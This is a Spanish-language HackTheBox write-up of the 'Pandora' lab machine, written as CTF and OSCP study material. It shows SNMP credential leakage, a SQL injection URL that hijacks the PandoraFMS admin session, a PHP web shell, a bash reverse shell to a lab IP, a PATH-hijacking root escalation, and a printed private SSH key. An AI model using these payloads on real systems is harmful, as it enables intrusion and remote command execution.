---
title: Pandora
published: 2025-08-13
image: "./logo.png"
tags: [Easy, SNMP, Information Leakage, Port Forwarding, SQLi, RCE, CVE-2019-20224, PandoraFMS, PATH Hijacking, OSCP, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- SNMP Fast Enumeration
- Information Leakage
- Local Port Forwarding
- SQL Injection - Admin Session Hijacking
- PandoraFMS v7.0NG Authenticated Remote Code Execution [CVE-2019-20224]
- Abusing Custom Binary - PATH Hijacking [Privilege Escalation]

### Preparación

- OSCP
- eWPT

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.11.136`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```
nmap -sVC -p22,80 10.10.11.136 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.11.136`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
❯ whatweb http://10.10.11.136
http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```

Después de hacer escaneos de **VHOST**, **Fuzzing** y revisar toda la web principal bien, no encontramos nada. Por lo que podríamos mirar por el lado **UDP.**

### UDP Scan

```bash
sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.136 -oN nmap/UDPScan
```

| Parámetro          | Descripción                                                                                            |
| ------------------ | ------------------------------------------------------------------------------------------------------ |
| `sudo`             | Ejecuta el comando con privilegios de superusuario (requerido para ciertos tipos de escaneo como UDP). |
| `nmap`             | Herramienta de escaneo de redes utilizada para descubrir hosts y servicios.                            |
| `-sU`              | Realiza un escaneo de puertos UDP.                                                                     |
| `--top-ports 100`  | Escanea los 100 puertos más comunes según la base de datos de Nmap.                                    |
| `--open`           | Muestra únicamente los puertos que estén abiertos.                                                     |
| `-T5`              | Ajusta la velocidad del escaneo al nivel más rápido (agresivo).                                        |
| `-v`               | Activa el modo detallado (verbose) para mostrar más información durante el escaneo.                    |
| `-n`               | No resuelve nombres DNS, usa únicamente direcciones IP.                                                |
| `10.10.11.136`     | Dirección IP del host objetivo.                                                                        |
| `-oN nmap/UDPScan` | Guarda el resultado en un archivo de salida normal (`nmap/UDPScan`).                                   |

```
PORT    STATE SERVICE
161/udp open  snmp
```

#### Puerto 161

```bash
sudo nmap -sUVC -p161 10.10.11.136 -oN nmap/UDPScanPrecise
```

| Parámetro                 | Descripción                                                                                                                          |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| `sudo`                    | Ejecuta el comando con privilegios de superusuario (necesario para ciertos tipos de escaneo como UDP).                               |
| `nmap`                    | Herramienta de escaneo de redes utilizada para descubrir hosts y servicios.                                                          |
| `-sUVC`                   | Combina tres opciones: `-sU` (escaneo UDP), `-sV` (detección de versión de servicios) y `-sC` (ejecuta scripts por defecto de Nmap). |
| `-p161`                   | Escanea únicamente el puerto 161 (SNMP).                                                                                             |
| `10.10.11.136`            | Dirección IP del host objetivo.                                                                                                      |
| `-oN nmap/UDPScanPrecise` | Guarda el resultado en un archivo de salida normal (`nmap/UDPScanPrecise`).                                                          |

```txt wrap=false
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 17h23m35s
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:42374   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 17h23m35.01s (6261501 timeticks)
| snmp-processes: 
|   1: 
|     Name: systemd
|   2: 
|     Name: kthreadd
|   3: 
|     Name: rcu_gp
|   4: 
|     Name: rcu_par_gp
|   6: 
|     Name: kworker/0:0H-kblockd
|   9: 
|     Name: mm_percpu_wq
|   10: 
|     Name: ksoftirqd/0
|   11: 
|     Name: rcu_sched
|   12: 
|     Name: migration/0
|   13: 
|     Name: idle_inject/0
|   14: 
|     Name: cpuhp/0
|   15: 
|     Name: cpuhp/1
|   16: 
|     Name: idle_inject/1
|   17: 
|     Name: migration/1
|   18: 
|     Name: ksoftirqd/1
|   20: 
|     Name: kworker/1:0H-kblockd
|   21: 
|     Name: kdevtmpfs
|   22: 
|     Name: netns
|   23: 
|     Name: rcu_tasks_kthre
|   24: 
|     Name: kauditd
|   25: 
|     Name: khungtaskd
|   26: 
|     Name: oom_reaper
|   27: 
|     Name: writeback
|   28: 
|     Name: kcompactd0
|   29: 
|     Name: ksmd
|   30: 
|     Name: khugepaged
|   77: 
|     Name: kintegrityd
|   78: 
|     Name: kblockd
|   79: 
|     Name: blkcg_punt_bio
|   80: 
|     Name: tpm_dev_wq
|   81: 
|     Name: ata_sff
|   82: 
|     Name: md
|   83: 
|     Name: edac-poller
|   84: 
|     Name: devfreq_wq
|   85: 
|     Name: watchdogd
|   88: 
|     Name: kswapd0
|   89: 
|     Name: ecryptfs-kthrea
|   91: 
|     Name: kthrotld
|   92: 
|     Name: irq/24-pciehp
|   93: 
|     Name: irq/25-pciehp
|   94: 
|     Name: irq/26-pciehp
|   95: 
|     Name: irq/27-pciehp
|   96: 
|     Name: irq/28-pciehp
|   97: 
|     Name: irq/29-pciehp
|   98: 
|     Name: irq/30-pciehp
|   99: 
|     Name: irq/31-pciehp
|   100: 
|     Name: irq/32-pciehp
|   101: 
|     Name: irq/33-pciehp
|   102: 
|     Name: irq/34-pciehp
|   103: 
|     Name: irq/35-pciehp
|   104: 
|     Name: irq/36-pciehp
|   105: 
|     Name: irq/37-pciehp
|   106: 
|     Name: irq/38-pciehp
|   107: 
|     Name: irq/39-pciehp
|   108: 
|     Name: irq/40-pciehp
|   109: 
|     Name: irq/41-pciehp
|   110: 
|     Name: irq/42-pciehp
|   111: 
|     Name: irq/43-pciehp
|   112: 
|     Name: irq/44-pciehp
|   113: 
|     Name: irq/45-pciehp
|   114: 
|     Name: irq/46-pciehp
|   115: 
|     Name: irq/47-pciehp
|   116: 
|     Name: irq/48-pciehp
|   117: 
|     Name: irq/49-pciehp
|   118: 
|     Name: irq/50-pciehp
|   119: 
|     Name: irq/51-pciehp
|   120: 
|     Name: irq/52-pciehp
|   121: 
|     Name: irq/53-pciehp
|   122: 
|     Name: irq/54-pciehp
|   123: 
|     Name: irq/55-pciehp
|   124: 
|     Name: acpi_thermal_pm
|   125: 
|     Name: scsi_eh_0
|   126: 
|     Name: scsi_tmf_0
|   127: 
|     Name: scsi_eh_1
|   128: 
|     Name: scsi_tmf_1
|   130: 
|     Name: vfio-irqfd-clea
|   131: 
|     Name: ipv6_addrconf
|   141: 
|     Name: kstrp
|   144: 
|     Name: kworker/u5:0
|   157: 
|     Name: charger_manager
|   202: 
|     Name: mpt_poll_0
|   203: 
|     Name: scsi_eh_2
|   204: 
|     Name: scsi_tmf_2
|   205: 
|     Name: mpt/0
|   206: 
|     Name: scsi_eh_3
|   207: 
|     Name: irq/16-vmwgfx
|   208: 
|     Name: ttm_swap
|   209: 
|     Name: scsi_tmf_3
|   210: 
|     Name: scsi_eh_4
|   211: 
|     Name: scsi_tmf_4
|   212: 
|     Name: scsi_eh_5
|   213: 
|     Name: scsi_tmf_5
|   214: 
|     Name: scsi_eh_6
|   215: 
|     Name: scsi_tmf_6
|   216: 
|     Name: scsi_eh_7
|   217: 
|     Name: scsi_tmf_7
|   218: 
|     Name: scsi_eh_8
|   219: 
|     Name: scsi_tmf_8
|   220: 
|     Name: scsi_eh_9
|   221: 
|     Name: scsi_tmf_9
|   222: 
|     Name: scsi_eh_10
|   223: 
|     Name: scsi_tmf_10
|   224: 
|     Name: scsi_eh_11
|   225: 
|     Name: scsi_tmf_11
|   226: 
|     Name: scsi_eh_12
|   227: 
|     Name: scsi_tmf_12
|   228: 
|     Name: scsi_eh_13
|   229: 
|     Name: scsi_tmf_13
|   230: 
|     Name: scsi_eh_14
|   231: 
|     Name: scsi_tmf_14
|   232: 
|     Name: scsi_eh_15
|   233: 
|     Name: scsi_tmf_15
|   234: 
|     Name: scsi_eh_16
|   235: 
|     Name: scsi_tmf_16
|   236: 
|     Name: scsi_eh_17
|   237: 
|     Name: scsi_tmf_17
|   238: 
|     Name: scsi_eh_18
|   239: 
|     Name: scsi_tmf_18
|   240: 
|     Name: scsi_eh_19
|   241: 
|     Name: scsi_tmf_19
|   242: 
|     Name: scsi_eh_20
|   243: 
|     Name: scsi_tmf_20
|   244: 
|     Name: scsi_eh_21
|   245: 
|     Name: scsi_tmf_21
|   246: 
|     Name: scsi_eh_22
|   247: 
|     Name: cryptd
|   248: 
|     Name: scsi_tmf_22
|   249: 
|     Name: scsi_eh_23
|   250: 
|     Name: scsi_tmf_23
|   251: 
|     Name: scsi_eh_24
|   252: 
|     Name: scsi_tmf_24
|   253: 
|     Name: scsi_eh_25
|   254: 
|     Name: scsi_tmf_25
|   255: 
|     Name: scsi_eh_26
|   256: 
|     Name: scsi_tmf_26
|   257: 
|     Name: scsi_eh_27
|   258: 
|     Name: scsi_tmf_27
|   259: 
|     Name: scsi_eh_28
|   269: 
|     Name: scsi_tmf_28
|   273: 
|     Name: scsi_eh_29
|   290: 
|     Name: scsi_tmf_29
|   294: 
|     Name: scsi_eh_30
|   295: 
|     Name: scsi_tmf_30
|   296: 
|     Name: scsi_eh_31
|   297: 
|     Name: scsi_tmf_31
|   329: 
|     Name: scsi_eh_32
|   330: 
|     Name: scsi_tmf_32
|   331: 
|     Name: kworker/1:1H-kblockd
|   337: 
|     Name: kworker/0:1H-kblockd
|   341: 
|     Name: kdmflush
|   343: 
|     Name: kdmflush
|   376: 
|     Name: raid5wq
|   433: 
|     Name: jbd2/dm-0-8
|   434: 
|     Name: ext4-rsv-conver
|   488: 
|     Name: systemd-journal
|   516: 
|     Name: systemd-udevd
|   543: 
|     Name: systemd-network
|   657: 
|     Name: kaluad
|   658: 
|     Name: kmpath_rdacd
|   659: 
|     Name: kmpathd
|   660: 
|     Name: kmpath_handlerd
|   661: 
|     Name: multipathd
|   669: 
|     Name: jbd2/sda2-8
|   670: 
|     Name: ext4-rsv-conver
|   682: 
|     Name: systemd-resolve
|   683: 
|     Name: systemd-timesyn
|   692: 
|     Name: accounts-daemon
|   693: 
|     Name: dbus-daemon
|   703: 
|     Name: irqbalance
|   705: 
|     Name: networkd-dispat
|   708: 
|     Name: rsyslogd
|   711: 
|     Name: systemd-logind
|   712: 
|     Name: udisksd
|   713: 
|     Name: VGAuthService
|   714: 
|     Name: vmtoolsd
|   818: 
|     Name: cron
|   825: 
|     Name: atd
|   827: 
|     Name: snmpd
|   829: 
|     Name: cron
|   862: 
|     Name: agetty
|   866: 
|     Name: sh
|   871: 
|     Name: sshd
|   939: 
|     Name: polkitd
|   950: 
|     Name: mysqld
|   984: 
|     Name: apache2
|   1085: 
|     Name: host_check
|   3006: 
|     Name: upowerd
|   3425: 
|     Name: apache2
|   3426: 
|     Name: apache2
|   3427: 
|     Name: apache2
|   3428: 
|     Name: apache2
|   3429: 
|     Name: apache2
|   4374: 
|     Name: kworker/0:2-events
|   4450: 
|     Name: kworker/1:0-events
|   4462: 
|     Name: kworker/u4:1-events_power_efficient
|   4541: 
|     Name: kworker/u4:0-events_power_efficient
|   4750: 
|     Name: kworker/0:1-events
|   4758: 
|_    Name: kworker/1:1
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 5.46 Mb sent, 5.46 Mb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:94:ca:a3 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 10.82 Mb sent, 61.05 Mb received
Service Info: Host: pandora
```

### SNMP (161 UDP)

**SNMP** significa **Simple Network Management Protocol** (Protocolo Simple de Administración de Red).\
Es un protocolo usado para **monitorear y administrar dispositivos en una red**, como routers, switches, servidores, impresoras y otros equipos.

Usaremos la herramienta **snmpwalk** para enumerar lo que hay en esta máquina con el siguiente comando:

```bash
snmpwalk -v2c -c public 10.10.11.136
```

| Parámetro      | Descripción                                                                                 |
| -------------- | ------------------------------------------------------------------------------------------- |
| `snmpwalk`     | Herramienta para consultar información de dispositivos que usan el protocolo SNMP.          |
| `-v2c`         | Usa la versión 2c de SNMP, que es común y más eficiente que la versión 1, pero sin cifrado. |
| `-c public`    | Comunidad SNMP (clave de acceso). `"public"` es el valor por defecto para solo lectura.     |
| `10.10.11.136` | Dirección IP del host objetivo que se desea consultar.                                      |

Esto nos devolverá una lista muy larga de información en la que podríamos ser capaces de ver algun dato filtrado importante como en esta ocasión:

```bash
iso.3.6.1.2.1.25.4.2.1.5.1085 = STRING: "-u daniel -p HotelBabylon23"
```

Aquí podemos ver un **usuario** y una **contraseña**, recordando que está abierto y disponible el **SSH**, podríamos probar estas credenciales:

```bash
daniel@pandora:~$ whoami
daniel
```

Si buscamos la flag del usuario, veremos que está en la carpeta de otro usuario, **matt**;

```bash
daniel@pandora:/home$ cd matt/
daniel@pandora:/home/matt$ ls
user.txt
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
```

Si buscamos por archivos con permisos **SUID** encontramos:

```bash
find / -perm -4000 2>/dev/null

/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup 
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

Que si vemos más información sobre `/usr/bin/pandora/backup`, vemos lo siguiente:

```bash
daniel@pandora:~$ ls -l /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
```

Seguimos necesitando ser **matt**, si investigamos en la ruta **/var/www**, vemos lo siguiente:

### Pandora

```bash
daniel@pandora:~$ cd /var/www
daniel@pandora:/var/www$ ls
html  pandora
```

```bash wrap=false
daniel@pandora:/var/www$ cd pandora/
daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console
daniel@pandora:/var/www/pandora$ cd pandora_console/
daniel@pandora:/var/www/pandora/pandora_console$ ls
ajax.php    composer.json  DEBIAN                extras   images        mobile                            pandora_console_logrotate_suse    pandoradb.sql                     vendor
attachment  composer.lock  docker_entrypoint.sh  fonts    include       operation                         pandora_console_logrotate_ubuntu  pandora_websocket_engine.service  ws.php
audit.log   COPYING        Dockerfile            general  index.php     pandora_console.log               pandora_console_upgrade           tests
AUTHORS     DB_Dockerfile  extensions            godmode  install.done  pandora_console_logrotate_centos  pandoradb_data.sql                tools
```

Además vemos que esta página esta corriendo en local en la máquina víctima:

```bash wrap=false
daniel@pandora:/var/www/pandora/pandora_console$ cat /etc/apache2/sites-available/pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

Vamos a hacer **port forwarding** hacia nuestra máquina para ver que es:

```bash
ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FjsGYx115BfDyDYdrWoie%2Fimage.png?alt=media&#x26;token=852709b6-ea8d-4b64-8ed4-b295499fedbc" alt=""><figcaption></figcaption></figure>

Abajo pone la versión:

```
v7.0NG.742_FIX_PERL2020
```

Encontramos un **SQLi** en la ruta:

```
http://localhost/pandora_console/include/chart_generator.php?session_id=1'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FvkVnvZ2yIZKSaKIhekye%2Fimage.png?alt=media&#x26;token=786fc3ed-db43-4bed-bd0e-1e9536b468ed" alt=""><figcaption></figcaption></figure>

## Explotación

Encontramos un exploit: [https://github.com/shyam0904a/Pandora\_v7.0NG.742\_exploit\_unauthenticated](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

Haciendo una petición a esta solicitud, nos logueará como admin:

```txt wrap=false
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FkyxQu6vSCitTjaTcZOTb%2Fimage.png?alt=media&#x26;token=61145848-b35a-44c9-bac1-c3745819dda9" alt=""><figcaption></figcaption></figure>

Lo siguiente que hace el exploit es subir un archivo malicioso haciendose pasar por una imagen, pero es un código **php**:

```php title="cmd.php"
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Una vez subido el archivo malicioso, podemos acceder a el y hacer una query:

```
http://localhost/pandora_console/images/pwned/cmd.php?cmd=whoami
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqvYi1tgqkX4sv6MV95Au%2Fimage.png?alt=media&#x26;token=d0aac52d-725f-4eb9-9f24-57cb72a0cbab" alt=""><figcaption></figcaption></figure>

### Reverse shell (matt)

Simplemente crearemos una reverse shell:

```
http://localhost/pandora_console/images/pwned/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261%22
```

```bash
matt@pandora:/home/matt$ cat user.txt 
543d71729cf4999d0...
```

## Escalada de privilegios

Si hacemos un **sudo -l:**

```bash
matt@pandora:/home/matt$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

Esto puede pasar por no estar conectados por SSH, por lo que vamos a generar claves con **ssh-keygen**:

```bash title="id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash title="id_rsa.pub"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+Uy3tib/DY94wBZzdTRPijWx++0Sfq63ZHvAgRO8dQ6MAVCyWGWHZkdOVtjZJwMSVFAAHR3Eb2fdwUX685EyBtibMQoq2sA/9iuHdo+eDOrLi7wHUrvNB1a1ZteDdwU6DiBoX3Ua1spgQ8Tce0O1c8eT9Qy9XQn8bkF0Mj9cYaNFvo2lLynD5ezeW7TfmbfrrG4Xbp3qJjpaQLy2YRq158MsQ+GnVJEQBIqZzkd+Vt2wUoN16w2veG1/duwLhMJGzu5s8OJzoYkm4k3i9pFi3Pu8cNrCsJnQx/XftcVD3vBoNML7Uz5x5nkReZq5NsAP6BIXBNUobfjRk3/73E5zmJ65YmzxeC2e13sH2VBMXm5UHP0qvt2tuR5pJUsnhannSdXmVxhdPZFk3TscWa50QSd13/thkggpkWCOADv0MQwY3HpoHOqnvjWbPdoGl7e+nst+JTbHfOmQ0J6PXSm854x+YId3gHLnX5486eWYBt01+99HUfalqSH8E/MpGkg0= matt@pandora
```

```bash
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys 
```

Luego nos traemos la **id\_rsa** a nuestra máquina local y la usamos para loguearnos (es posible que te de problemas con los permisos, usa: **chmod 600**):

```bash
ssh -i id_rsa matt@10.10.11.136
```

Ahora funciona todo correctamente. Usaremos **ltrace** para saber que hace el programa llamado **pandora\_backup**:

```bash wrap=false
matt@pandora:~$ ltrace pandora_backup
getuid()                                                                                                         = 1000
geteuid()                                                                                                        = 1000
setreuid(1000, 1000)                                                                                             = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                                                                = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                                                      = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                           = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                                                     = 39
+++ exited (status 1) +++
```

### Path Hijacking

Vemos que usa **tar** de manera relativa, lo cual podría llevar a un **Path Hijacking**:

```bash title="tar en /tmp"
/usr/bin/sh
```

```bash title="Permisos de ejecución"
chmod +x tar
```

```bash title="Cambiamos el path para que contemple /tmp de primeras"
matt@pandora:/tmp$ export PATH=/tmp:$PATH
```

```bash
root@pandora:/tmp# whoami
root
root@pandora:/tmp# cd /root
root@pandora:/root# cat root.txt 
cccafa632bb7373dbf59...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/423)

---